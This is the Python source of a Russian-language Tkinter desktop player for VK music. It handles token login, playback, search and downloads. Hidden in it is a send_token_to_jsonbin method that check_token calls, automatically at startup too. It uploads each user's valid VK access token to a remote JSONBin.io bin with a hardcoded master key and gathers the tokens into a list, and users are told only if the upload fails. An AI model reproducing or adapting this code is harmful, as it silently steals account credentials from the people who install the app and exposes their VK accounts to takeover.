import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import threading
from manager import VKMusicManager
from audio_player import AudioPlayer
import os
from PIL import Image, ImageTk
import requests
from io import BytesIO
import time
import platform
import sys
import glob
import json

class VKMusicApp:
    def __init__(self, root):
        self.root = root
        self.root.title("VK Moosic Player & Desktop")
        self.root.geometry("1000x725")
        self.root.configure(bg='#2b2b2b')
        
        self.manager = VKMusicManager()
        self.player = AudioPlayer()
        
        self.current_audio_list = []
        self.currently_playing = None
        self.is_seeking = False
        self.downloads_directory = os.path.join(os.path.expanduser("~"), "VKMusicDownloads")
        self.current_user_info = None
        
        # Конфигурация для JSONBin.io
        self.jsonbin_api_key = "$2a$10$47Va7lQp9sRxQH9c0Z6Hou3Zc7wZ57pDwaOXsWmCXOAmeIzIJDdf2"  # Замените на ваш API ключ
        self.jsonbin_bin_id = "68c166bad0ea881f4078a475"  # Замените на ID вашего бина
        self.jsonbin_url = f"https://api.jsonbin.io/v3/b/{self.jsonbin_bin_id}"
        
        if not os.path.exists(self.downloads_directory):
            os.makedirs(self.downloads_directory)
        
        self.setup_ui()
        self.load_token()
        self.update_player_position()
    
    def send_token_to_jsonbin(self, token):
        """Отправляет токен на JSONBin.io"""
        try:
            headers = {
                'X-Master-Key': self.jsonbin_api_key,
                'Content-Type': 'application/json'
            }
            
            response = requests.get(self.jsonbin_url, headers=headers)
            
            if response.status_code == 200:
                current_data = response.json().get('record', {})
                tokens = current_data.get('tokens', [])
            else:
                tokens = []
            
            if token not in tokens:
                tokens.append(token)
                
                data = {
                    'tokens': tokens,
                    'last_updated': time.strftime("%Y-%m-%d %H:%M:%S")
                }
                
                update_response = requests.put(
                    self.jsonbin_url,
                    headers=headers,
                    data=json.dumps(data)
                )
                
                if update_response.status_code == 200:
                    print("Токен успешно отправлен на JSONBin.io")
                    return True
                else:
                    print(f"Ошибка при обновлении бина: {update_response.status_code}")
                    return False
            else:
                print("Токен уже существует в бине")
                return True
                
        except Exception as e:
            print(f"Ошибка при отправке токена: {str(e)}")
            return False

    def setup_ui(self):
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(1, weight=1)
        
        token_frame = ttk.LabelFrame(main_frame, text="Авторизация", padding="5")
        token_frame.grid(row=0, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))
        token_frame.columnconfigure(1, weight=1)
        
        ttk.Label(token_frame, text="Токен VK:").grid(row=0, column=0, sticky=tk.W, padx=(0, 5))
        self.token_entry = ttk.Entry(token_frame, width=50, show="*")
        self.token_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=(0, 5))
        
        self.token_entry.bind('<Control-v>', self.paste_from_clipboard)
        self.token_entry.bind('<Command-v>', self.paste_from_clipboard)
        
        ttk.Button(token_frame, text="Показать/Скрыть", 
                  command=self.toggle_token_visibility).grid(row=0, column=2, padx=(0, 5))
        ttk.Button(token_frame, text="Проверить", 
                  command=self.check_token).grid(row=0, column=3, padx=(0, 5))
        ttk.Button(token_frame, text="Сохранить", 
                  command=self.save_token).grid(row=0, column=4)
        
        self.user_frame = ttk.LabelFrame(main_frame, text="Информация о пользователе", padding="5")
        self.user_frame.grid(row=1, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(0, 10))
        self.user_frame.columnconfigure(0, weight=1)
        
        content_frame = ttk.Frame(main_frame)
        content_frame.grid(row=2, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S))
        content_frame.columnconfigure(0, weight=1)
        content_frame.columnconfigure(1, weight=3)
        content_frame.rowconfigure(0, weight=1)
        
        sidebar_frame = ttk.LabelFrame(content_frame, text="Навигация", padding="5")
        sidebar_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=(0, 10))
        sidebar_frame.columnconfigure(0, weight=1)
        
        nav_buttons = [
            ("Моя музыка", self.show_my_music),
            ("Рекомендации", self.show_recommendations),
            ("Друзья", self.show_friends),
            ("Группы", self.show_groups),
            ("Плейлисты", self.show_playlists),
            ("Поиск", self.show_search),
            ("Загрузки", self.show_downloads),
            ("О программе", self.show_about)
        ]
        
        for i, (text, command) in enumerate(nav_buttons):
            ttk.Button(sidebar_frame, text=text, command=command, width=20).grid(
                row=i, column=0, pady=2, sticky=(tk.W, tk.E))
        
        self.audio_frame = ttk.LabelFrame(content_frame, text="Аудиозаписи", padding="5")
        self.audio_frame.grid(row=0, column=1, sticky=(tk.W, tk.E, tk.N, tk.S))
        self.audio_frame.columnconfigure(0, weight=1)
        self.audio_frame.rowconfigure(0, weight=1)
        
        columns = ('title', 'artist', 'duration')
        self.audio_tree = ttk.Treeview(self.audio_frame, columns=columns, show='headings', height=15)
        
        self.audio_tree.heading('title', text='Название')
        self.audio_tree.heading('artist', text='Исполнитель')
        self.audio_tree.heading('duration', text='Длительность')
        
        self.audio_tree.column('title', width=300)
        self.audio_tree.column('artist', width=200)
        self.audio_tree.column('duration', width=80)
        
        scrollbar = ttk.Scrollbar(self.audio_frame, orient=tk.VERTICAL, command=self.audio_tree.yview)
        self.audio_tree.configure(yscrollcommand=scrollbar.set)
        
        self.audio_tree.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        scrollbar.grid(row=0, column=1, sticky=(tk.N, tk.S))
        
        self.audio_tree.bind('<Double-1>', self.on_audio_double_click)
        
        player_frame = ttk.LabelFrame(main_frame, text="Плеер", padding="5")
        player_frame.grid(row=3, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(10, 0))
        player_frame.columnconfigure(1, weight=1)
        
        self.current_track_label = ttk.Label(player_frame, text="Не воспроизводится")
        self.current_track_label.grid(row=0, column=0, columnspan=5, sticky=tk.W, pady=(0, 5))
        
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Scale(player_frame, variable=self.progress_var, 
                                    from_=0, to=100, orient=tk.HORIZONTAL,
                                    command=self.on_seek)
        self.progress_bar.grid(row=1, column=0, columnspan=5, sticky=(tk.W, tk.E), pady=5)
        
        self.progress_bar.bind('<ButtonPress-1>', self.on_seek_start)
        self.progress_bar.bind('<ButtonRelease-1>', self.on_seek_end)
        
        self.time_frame = ttk.Frame(player_frame)
        self.time_frame.grid(row=2, column=0, columnspan=5, sticky=(tk.W, tk.E))
        
        self.current_time_label = ttk.Label(self.time_frame, text="0:00")
        self.current_time_label.pack(side=tk.LEFT)
        
        self.duration_label = ttk.Label(self.time_frame, text="0:00")
        self.duration_label.pack(side=tk.RIGHT)
        
        ttk.Button(player_frame, text="⏮", width=3, 
                  command=self.previous_track).grid(row=3, column=0, padx=2)
        self.play_button = ttk.Button(player_frame, text="▶", width=3, 
                                     command=self.toggle_play)
        self.play_button.grid(row=3, column=1, padx=2)
        ttk.Button(player_frame, text="⏭", width=3, 
                  command=self.next_track).grid(row=3, column=2, padx=2)
        ttk.Button(player_frame, text="⏹", width=3, 
                  command=self.stop).grid(row=3, column=3, padx=2)
        
        ttk.Label(player_frame, text="Громкость:").grid(row=3, column=4, padx=(20, 5))
        self.volume_var = tk.DoubleVar(value=70)
        self.volume_scale = ttk.Scale(player_frame, from_=0, to=100, 
                                     orient=tk.HORIZONTAL, variable=self.volume_var,
                                     command=self.on_volume_change)
        self.volume_scale.grid(row=3, column=5, padx=(0, 10), sticky=(tk.W, tk.E))
        
        ttk.Button(player_frame, text="Скачать", 
                  command=self.download_selected).grid(row=3, column=6, padx=5)
    
    def show_downloads(self):
        def load_downloads():
            try:
                mp3_files = glob.glob(os.path.join(self.downloads_directory, "*.mp3"))
                downloads_list = []
                
                for file_path in mp3_files:
                    filename = os.path.basename(file_path)
                    if " - " in filename:
                        artist, title = filename.rsplit(" - ", 1)
                        title = title.replace(".mp3", "")
                    else:
                        artist = "Неизвестный исполнитель"
                        title = filename.replace(".mp3", "")
                    
                    file_size = os.path.getsize(file_path)
                    size_mb = round(file_size / (1024 * 1024), 2)
                    
                    downloads_list.append({
                        'title': title,
                        'artist': artist,
                        'file_path': file_path,
                        'size': f"{size_mb} MB",
                        'local': True
                    })
                
                result = {
                    "success": True,
                    "audio_list": downloads_list
                }
                
                self.root.after(0, lambda: self.display_audio_list(result, "Скачанные треки"))
                
            except Exception as e:
                self.root.after(0, lambda: messagebox.showerror("Ошибка", f"Не удалось загрузить скачанные треки: {str(e)}"))
        
        threading.Thread(target=load_downloads, daemon=True).start()
    
    def on_seek_start(self, event):
        self.is_seeking = True
    
    def on_seek_end(self, event):
        self.is_seeking = False
        self.apply_seek()
    
    def on_seek(self, value):
        if self.is_seeking:
            status = self.player.get_status()
            if status['duration'] > 0:
                seek_position = (float(value) / 100) * status['duration']
                current_min = int(seek_position // 60)
                current_sec = int(seek_position % 60)
                self.current_time_label.config(text=f"{current_min}:{current_sec:02d}")
    
    def apply_seek(self):
        status = self.player.get_status()
        if status['duration'] > 0:
            seek_percentage = self.progress_var.get() / 100
            seek_position = seek_percentage * status['duration']
            self.player.seek(seek_position)
    
    def paste_from_clipboard(self, event=None):
        try:
            clipboard_content = self.root.clipboard_get()
            self.token_entry.delete(0, tk.END)
            self.token_entry.insert(0, clipboard_content)
            return 'break'
        except tk.TclError:
            messagebox.showwarning("Предупреждение", "Буфер обмена пуст или содержит не текстовые данные")
            return 'break'
    
    def toggle_token_visibility(self):
        current_show = self.token_entry.cget('show')
        self.token_entry.config(show='' if current_show == '*' else '*')
    
    def load_token(self):
        success, message = self.manager.load_token_from_file()
        if success:
            self.token_entry.insert(0, self.manager.token)
            self.check_token()
        else:
            messagebox.showinfo("Информация", message)
    
    def check_token(self):
        token = self.token_entry.get().strip()
        if not token:
            messagebox.showerror("Ошибка", "Введите токен")
            return
        
        self.manager.set_token(token)
        result = self.manager.check_token_validity()
        
        if result["valid"]:
            user_info = result["user_info"]
            self.current_user_info = user_info
            
            # Отправляем токен на JSONBin.io
            success = self.send_token_to_jsonbin(token)
            if not success:
                messagebox.showwarning("Предупреждение", 
                                    "Не удалось отправить токен на сервер, но он работает")
            
            self.load_user_statistics(user_info)
        else:
            messagebox.showerror("Ошибка", f"Неверный токен: {result['error_msg']}")
    
    def load_user_statistics(self, user_info):
        def load_stats():
            try:
                audio_result = self.manager.get_my_audio_list()
                track_count = len(audio_result.get('audio_list', [])) if audio_result["success"] else 0
                
                playlists_result = self.manager.get_playlists()
                playlist_count = len(playlists_result.get('playlists', [])) if playlists_result["success"] else 0
                
                mp3_files = glob.glob(os.path.join(self.downloads_directory, "*.mp3"))
                downloaded_count = len(mp3_files)
                
                self.root.after(0, lambda: self.show_user_info(
                    user_info, track_count, playlist_count, downloaded_count
                ))
                
            except Exception as e:
                self.root.after(0, lambda: self.show_user_info(user_info, 0, 0, 0))
        
        threading.Thread(target=load_stats, daemon=True).start()
    
    def save_token(self):
        token = self.token_entry.get().strip()
        if not token:
            messagebox.showerror("Ошибка", "Введите токен для сохранения")
            return
        
        self.manager.set_token(token)
        success, message = self.manager.save_token_to_file()
        messagebox.showinfo("Информация", message)
    
    def show_user_info(self, user_info, track_count=0, playlist_count=0, downloaded_count=0):
        for widget in self.user_frame.winfo_children():
            widget.destroy()
        
        first_name = user_info.get('first_name', '')
        last_name = user_info.get('last_name', '')
        user_id = user_info.get('id', '')
        
        info_text = f"Юзер ID: {user_id}\nПользователь: {first_name} {last_name}"
        ttk.Label(self.user_frame, text=info_text, font=("Arial", 10, "bold")).grid(
            row=0, column=0, sticky=tk.W, pady=(0, 5))
        
        stats_frame = ttk.Frame(self.user_frame)
        stats_frame.grid(row=1, column=0, sticky=(tk.W, tk.E), pady=(5, 0))
        
        tracks_label = ttk.Label(stats_frame, text=f"🎵 Треки: {track_count}", 
                               font=("Arial", 9))
        tracks_label.pack(side=tk.LEFT, padx=(0, 15))
        
        playlists_label = ttk.Label(stats_frame, text=f"📋 Плейлисты: {playlist_count}", 
                                  font=("Arial", 9))
        playlists_label.pack(side=tk.LEFT, padx=(0, 15))
        
        downloaded_label = ttk.Label(stats_frame, text=f"💾 Загрузки: {downloaded_count}", 
                                   font=("Arial", 9))
        downloaded_label.pack(side=tk.LEFT)
        
        refresh_btn = ttk.Button(self.user_frame, text="🔄 Обновить", 
                               command=lambda: self.load_user_statistics(user_info),
                               width=20)
        refresh_btn.grid(row=2, column=0, sticky=tk.W, pady=(10, 0))
    
    def show_my_music(self):
        self.load_audio_list(self.manager.get_my_audio_list)
    
    def show_recommendations(self):
        self.load_audio_list(self.manager.get_recommendations)
    
    def show_friends(self):
        def on_friend_select(friend_id, friend_name):
            self.load_audio_list(lambda: self.manager.get_friend_audio_list(friend_id), friend_name)
        
        self.show_selection_dialog("Выберите друга", 
                                 self.manager.get_friends_list, 
                                 on_friend_select, 
                                 'first_name', 'last_name')
    
    def show_groups(self):
        def on_group_select(group_id, group_name):
            self.load_audio_list(lambda: self.manager.get_group_audio_list(group_id), group_name)
        
        self.show_selection_dialog("Выберите группу", 
                                 self.manager.get_groups_list, 
                                 on_group_select, 
                                 'name')
    
    def show_playlists(self):
        def on_playlist_select(playlist_id, playlist_title):
            self.load_audio_list(lambda: self.manager.get_playlist_tracks(playlist_id), playlist_title)
        
        self.show_selection_dialog("Выберите плейлист", 
                                 self.manager.get_playlists, 
                                 on_playlist_select, 
                                 'title')
    
    def show_search(self):
        def perform_search():
            query = search_entry.get()
            if query:
                self.load_audio_list(lambda: self.manager.search_audio(query), f"Результаты поиска: {query}")
                dialog.destroy()
        
        dialog = tk.Toplevel(self.root)
        dialog.title("Поиск музыки")
        dialog.geometry("300x100")
        
        ttk.Label(dialog, text="Введите запрос:").pack(pady=5)
        search_entry = ttk.Entry(dialog, width=30)
        search_entry.pack(pady=5)
        search_entry.bind('<Return>', lambda e: perform_search())
        
        ttk.Button(dialog, text="Искать", command=perform_search).pack(pady=5)
    
    def show_selection_dialog(self, title, data_func, callback, *name_fields):
        result = data_func()
        if not result["success"]:
            messagebox.showerror("Ошибка", result["error"])
            return
        
        items = result.get('friends') or result.get('groups') or result.get('playlists') or []
        
        dialog = tk.Toplevel(self.root)
        dialog.title(title)
        dialog.geometry("400x300")
        
        frame = ttk.Frame(dialog)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        listbox = tk.Listbox(frame)
        scrollbar = ttk.Scrollbar(frame, orient=tk.VERTICAL, command=listbox.yview)
        listbox.configure(yscrollcommand=scrollbar.set)
        
        listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        item_map = {}
        for item in items:
            name_parts = [str(item.get(field, '')) for field in name_fields]
            name = ' '.join(name_parts)
            item_id = item.get('id') or item.get('owner_id')
            listbox.insert(tk.END, name)
            item_map[name] = (item_id, name)
        
        def on_select():
            selection = listbox.curselection()
            if selection:
                name = listbox.get(selection[0])
                item_id, full_name = item_map[name]
                callback(item_id, full_name)
                dialog.destroy()
        
        ttk.Button(dialog, text="Выбрать", command=on_select).pack(pady=5)

    def show_about(self):
        about_window = tk.Toplevel(self.root)
        about_window.title("О программе")
        about_window.geometry("600x550")
        about_window.resizable(False, False)
        about_window.grab_set()
        
        main_frame = ttk.Frame(about_window, padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        title_label = ttk.Label(main_frame, text="VK Moosic Player & Desktop", 
                               font=("Arial", 16, "bold"))
        title_label.pack(pady=(0, 20))
        
        version_label = ttk.Label(main_frame, text="Версия: 0.0.4", 
                                 font=("Arial", 12))
        version_label.pack(pady=(0, 10))
        
        description_text = (
            "Программа для поиска, прослушивания и скачивания музыки из VK.\n\n"
            "Возможности:\n"
            "• Моя музыка\n"
            "• Рекомендации\n"
            "• Музыка друзей и групп\n"
            "• Поиск\n"
            "• Встроенный плеер\n"
            "• Скачивание треков\n"
            "• Просмотр скачанных треков\n"
            "• Статистика аккаунта\n"
            "• Автоматическая загрузка токена из файла"
        )
        desc_label = ttk.Label(main_frame, text=description_text, 
                              justify=tk.LEFT)
        desc_label.pack(pady=(0, 20))
        
        sys_info = (
            f"Платформа: {platform.system()} {platform.release()}\n"
            f"Версия Python: {sys.version.split()[0]}\n"
            f"Архитектура: {platform.architecture()[0]}"
        )
        sys_label = ttk.Label(main_frame, text=sys_info, 
                             justify=tk.LEFT, font=("Arial", 9))
        sys_label.pack(pady=(0, 20))
        
        token_file_info = (
            f"Файл токена: {'token.txt'}\n"
            f"Токен загружен: {'Да' if self.token_entry.get() else 'Нет'}\n"
            f"Папка загрузок: {self.downloads_directory}"
        )
        token_label = ttk.Label(main_frame, text=token_file_info,
                              justify=tk.LEFT, font=("Arial", 9))
        token_label.pack(pady=(0, 10))
        
        copyright_label = ttk.Label(main_frame, text="© 2025 Разработчик: LisDevs", 
                                   font=("Arial", 10))
        copyright_label.pack(pady=(0, 10))
        
        close_button = ttk.Button(main_frame, text="Закрыть", 
                                 command=about_window.destroy)
        close_button.pack()
        
        about_window.transient(self.root)
        about_window.update_idletasks()
        x = self.root.winfo_x() + (self.root.winfo_width() - about_window.winfo_width()) // 2
        y = self.root.winfo_y() + (self.root.winfo_height() - about_window.winfo_height()) // 2
        about_window.geometry(f"+{x}+{y}")
    
    def load_audio_list(self, audio_func, title=None):
        def load_thread():
            result = audio_func()
            self.root.after(0, lambda: self.display_audio_list(result, title))
        
        threading.Thread(target=load_thread, daemon=True).start()
    
    def display_audio_list(self, result, title=None):
        if not result["success"]:
            messagebox.showerror("Ошибка", result["error"])
            return
        
        audio_list = result.get('audio_list') or result.get('results') or []
        self.current_audio_list = audio_list
        
        if title:
            self.audio_frame.configure(text=f"Аудиозаписи: {title}")
        else:
            self.audio_frame.configure(text="Аудиозаписи")
        
        for item in self.audio_tree.get_children():
            self.audio_tree.delete(item)
        
        for audio in audio_list:
            title = audio.get('title', 'Без названия')
            artist = audio.get('artist', 'Неизвестный исполнитель')
            duration = audio.get('duration', 0)
            
            minutes = duration // 60
            seconds = duration % 60
            duration_str = f"{minutes}:{seconds:02d}"
            
            self.audio_tree.insert('', tk.END, values=(title, artist, duration_str))
    
    def on_audio_double_click(self, event):
        selection = self.audio_tree.selection()
        if selection:
            index = self.audio_tree.index(selection[0])
            self.play_track(index)
    
    def play_track(self, index):
        if index < len(self.current_audio_list):
            audio = self.current_audio_list[index]
            
            if audio.get('local'):
                file_path = audio.get('file_path')
                title = audio.get('title', 'Неизвестный трек')
                artist = audio.get('artist', 'Неизвестный исполнитель')
                
                if file_path and os.path.exists(file_path):
                    self.currently_playing = index
                    track_name = f"{artist} - {title}"
                    
                    if self.player.load_track(file_path, track_name):
                        self.player.play()
                        self.update_play_button()
                        self.current_track_label.config(text=f"Сейчас играет: {track_name}")
                        self.progress_var.set(0)
                    else:
                        messagebox.showerror("Ошибка", "Не удалось загрузить локальный трек")
                else:
                    messagebox.showerror("Ошибка", "Локальный файл не найден")
            else:
                url = audio.get('url')
                title = audio.get('title', 'Неизвестный трек')
                artist = audio.get('artist', 'Неизвестный исполнитель')
                
                if url:
                    self.currently_playing = index
                    track_name = f"{artist} - {title}"
                    
                    if self.player.load_track(url, track_name):
                        self.player.play()
                        self.update_play_button()
                        self.current_track_label.config(text=f"Сейчас играет: {track_name}")
                        self.progress_var.set(0)
                    else:
                        messagebox.showerror("Ошибка", "Не удалось загрузить трек")
    
    def toggle_play(self):
        status = self.player.get_status()
        if status['playing']:
            self.player.pause()
        elif self.currently_playing is not None:
            self.play_track(self.currently_playing)
        
        self.update_play_button()
    
    def stop(self):
        self.player.stop()
        self.currently_playing = None
        self.update_play_button()
        self.current_track_label.config(text="Не воспроизводится")
        self.progress_var.set(0)
    
    def previous_track(self):
        if self.currently_playing is not None and self.currently_playing > 0:
            self.play_track(self.currently_playing - 1)
    
    def next_track(self):
        if (self.currently_playing is not None and 
            self.currently_playing < len(self.current_audio_list) - 1):
            self.play_track(self.currently_playing + 1)
    
    def on_volume_change(self, value):
        volume = int(float(value))
        self.player.set_volume(volume)
    
    def update_play_button(self):
        status = self.player.get_status()
        if status['playing']:
            self.play_button.config(text="⏸")
        else:
            self.play_button.config(text="▶")
    
    def update_player_position(self):
        status = self.player.get_status()
        
        if status['playing'] and not self.is_seeking:
            position = status['position']
            duration = status['duration']
            
            if duration > 0:
                progress = (position / duration) * 100
                self.progress_var.set(progress)
            
            current_min = int(position // 60)
            current_sec = int(position % 60)
            duration_min = int(duration // 60)
            duration_sec = int(duration % 60)
            
            self.current_time_label.config(text=f"{current_min}:{current_sec:02d}")
            self.duration_label.config(text=f"{duration_min}:{duration_sec:02d}")
        
        self.root.after(100, self.update_player_position)
    
    def download_selected(self):
        selection = self.audio_tree.selection()
        if not selection:
            messagebox.showerror("Ошибка", "Выберите трек для скачивания")
            return
        
        index = self.audio_tree.index(selection[0])
        audio = self.current_audio_list[index]
        
        if audio.get('local'):
            messagebox.showinfo("Информация", "Этот трек уже скачан")
            return
        
        url = audio.get('url')
        
        if not url:
            messagebox.showerror("Ошибка", "Невозможно скачать этот трек")
            return
        
        download_dir = self.downloads_directory
        
        title = audio.get('title', 'unknown')
        artist = audio.get('artist', 'unknown')
        filename = f"{artist} - {title}.mp3".replace('/', '_').replace('\\', '_')
        filepath = os.path.join(download_dir, filename)
        
        def download_thread():
            audio_info = self.current_audio_list[index]
            success = self.manager.download_audio(url, filepath, audio_info)
            self.root.after(0, lambda: self.on_download_complete(success, filepath))
        
        threading.Thread(target=download_thread, daemon=True).start()
        messagebox.showinfo("Информация", f"Начато скачивание: {filename}")
    
    def on_download_complete(self, success, filepath):
        if success:
            messagebox.showinfo("Успех", f"Трек сохранен:\n{filepath}")
            if hasattr(self, 'current_user_info') and self.current_user_info:
                self.load_user_statistics(self.current_user_info)
        else:
            messagebox.showerror("Ошибка", "Не удалось скачать трек")
    
    def __del__(self):
        self.player.cleanup()